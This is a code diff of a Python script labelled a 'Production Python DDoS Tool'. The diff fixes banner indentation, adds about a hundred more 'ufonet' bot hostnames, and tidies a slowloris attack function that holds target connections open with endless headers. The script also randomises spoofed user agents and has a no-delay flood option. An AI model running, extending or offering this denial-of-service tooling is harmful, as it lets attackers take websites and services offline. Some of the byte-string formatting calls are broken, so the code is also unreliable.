@@ -38,9 +38,9 @@ def banner():
 """
 
     print(Fore.WHITE + Back.BLACK + banner_text)
-print(f"{Back.BLACK}{Fore.WHITE}{'=' * 90}")
-print(f"{Back.BLACK}{Fore.WHITE}Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
-print(f"{Back.BLACK}{Fore.WHITE}{'=' * 90}\n")
+    print(f"{Back.BLACK}{Fore.WHITE}{'=' * 90}")
+    print(f"{Back.BLACK}{Fore.WHITE}Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    print(f"{Back.BLACK}{Fore.WHITE}{'=' * 90}\n")
 
 def parse_args():
     parser = argparse.ArgumentParser(description=f"{Back.BLACK}{Fore.WHITE}Production Python DDoS Tool")
@@ -51,6 +51,7 @@ def parse_args():
     parser.add_argument("-m", "--method", choices=['GET', 'POST', 'HEAD', 'OPTIONS'], default='GET', help=f"{Back.BLACK}{Fore.WHITE}HTTP method")
     parser.add_argument("-d", "--delay", type=float, default=0, help=f"{Back.BLACK}{Fore.WHITE}Delay between requests (0=max speed)")
     return parser.parse_args()
+
 user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
@@ -84,7 +85,6 @@ user_agents = [
     'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    
     'Mozilla/5.0 (Linux; Android 8.1.0; Moto G (5S)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36',
     'Mozilla/5.0 (Linux; Android 9; itel L6005) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36',
     'Mozilla/5.0 (Linux; Android 10; LYA-L29 Build/HUAWEILYA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
@@ -186,6 +186,7 @@ user_agents = [
     'Mozilla/5.0 (Linux; Android 9; vivo 1920) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.67 Safari/537.36 Edg/87.0.664.52',
 ]
+
 ufonet_bots = [
     'bot1.ufonet.com', 'bot2.ufonet.com', 'bot3.ufonet.com', 'bot4.ufonet.com', 'bot5.ufonet.com',
     'bot6.ufonet.com', 'bot7.ufonet.com', 'bot8.ufonet.com', 'bot9.ufonet.com', 'bot10.ufonet.com',
@@ -379,9 +380,28 @@ additional_bots = [
     'bot1277.ufonet.com', 'bot1278.ufonet.com', 'bot1279.ufonet.com', 'bot1280.ufonet.com','bot1281.ufonet.com', 'bot1282.ufonet.com', 'bot1283.ufonet.com', 'bot1284.ufonet.com',
     'bot1285.ufonet.com', 'bot1286.ufonet.com', 'bot1287.ufonet.com', 'bot1288.ufonet.com','bot1289.ufonet.com', 'bot1290.ufonet.com', 'bot1291.ufonet.com', 'bot1292.ufonet.com',
     'bot1293.ufonet.com', 'bot1294.ufonet.com', 'bot1295.ufonet.com', 'bot1296.ufonet.com','bot1297.ufonet.com', 'bot1298.ufonet.com', 'bot1299.ufonet.com', 'bot1300.ufonet.com',
-
-
+    'bot1301.ufonet.com', 'bot1302.ufonet.com', 'bot1303.ufonet.com', 'bot1304.ufonet.com', 'bot1305.ufonet.com',
+    'bot1306.ufonet.com', 'bot1307.ufonet.com', 'bot1308.ufonet.com', 'bot1309.ufonet.com', 'bot1310.ufonet.com',
+    'bot1311.ufonet.com', 'bot1312.ufonet.com', 'bot1313.ufonet.com', 'bot1314.ufonet.com', 'bot1315.ufonet.com',
+    'bot1316.ufonet.com', 'bot1317.ufonet.com', 'bot1318.ufonet.com', 'bot1319.ufonet.com', 'bot1320.ufonet.com',
+    'bot1321.ufonet.com', 'bot1322.ufonet.com', 'bot1323.ufonet.com', 'bot1324.ufonet.com', 'bot1325.ufonet.com',
+    'bot1326.ufonet.com', 'bot1327.ufonet.com', 'bot1328.ufonet.com', 'bot1329.ufonet.com', 'bot1330.ufonet.com',
+    'bot1331.ufonet.com', 'bot1332.ufonet.com', 'bot1333.ufonet.com', 'bot1334.ufonet.com', 'bot1335.ufonet.com',
+    'bot1336.ufonet.com', 'bot1337.ufonet.com', 'bot1338.ufonet.com', 'bot1339.ufonet.com', 'bot1340.ufonet.com',
+    'bot1341.ufonet.com', 'bot1342.ufonet.com', 'bot1343.ufonet.com', 'bot1344.ufonet.com', 'bot1345.ufonet.com',
+    'bot1346.ufonet.com', 'bot1347.ufonet.com', 'bot1348.ufonet.com', 'bot1349.ufonet.com', 'bot1350.ufonet.com',
+    'bot1351.ufonet.com', 'bot1352.ufonet.com', 'bot1353.ufonet.com', 'bot1354.ufonet.com', 'bot1355.ufonet.com',
+    'bot1356.ufonet.com', 'bot1357.ufonet.com', 'bot1358.ufonet.com', 'bot1359.ufonet.com', 'bot1360.ufonet.com',
+    'bot1361.ufonet.com', 'bot1362.ufonet.com', 'bot1363.ufonet.com', 'bot1364.ufonet.com', 'bot1365.ufonet.com',
+    'bot1366.ufonet.com', 'bot1367.ufonet.com', 'bot1368.ufonet.com', 'bot1369.ufonet.com', 'bot1370.ufonet.com',
+    'bot1371.ufonet.com', 'bot1372.ufonet.com', 'bot1373.ufonet.com', 'bot1374.ufonet.com', 'bot1375.ufonet.com',
+    'bot1376.ufonet.com', 'bot1377.ufonet.com', 'bot1378.ufonet.com', 'bot1379.ufonet.com', 'bot1380.ufonet.com',
+    'bot1381.ufonet.com', 'bot1382.ufonet.com', 'bot1383.ufonet.com', 'bot1384.ufonet.com', 'bot1385.ufonet.com',
+    'bot1386.ufonet.com', 'bot1387.ufonet.com', 'bot1388.ufonet.com', 'bot1389.ufonet.com', 'bot1390.ufonet.com',
+    'bot1391.ufonet.com', 'bot1392.ufonet.com', 'bot1393.ufonet.com', 'bot1394.ufonet.com', 'bot1395.ufonet.com',
+    'bot1396.ufonet.com', 'bot1397.ufonet.com', 'bot1398.ufonet.com', 'bot1399.ufonet.com', 'bot1400.ufonet.com',
 ]
+
 def rand_string(length=10):
     chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
     return ''.join(random.choice(chars) for _ in range(length))
@@ -408,8 +428,8 @@ def slowloris_attack(target_host, port):
     sock.settimeout(4)
     try:
         sock.connect((target_host, port))
-        sock.send(b"GET /?{} HTTP/1.1\r\n".format(rand_string()).encode()) #type:ignore
-        sock.send(b"Host: {}\r\n".format(target_host.encode())) #type:ignore
+        sock.send(b"GET /?{} HTTP/1.1\r\n".format(rand_string()).encode())
+        sock.send(b"Host: {}\r\n".format(target_host.encode()))
         
         while True:
             sock.send((f"X-A: {random.randint(1,5000)}\r\n").encode())
@@ -548,4 +568,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-    
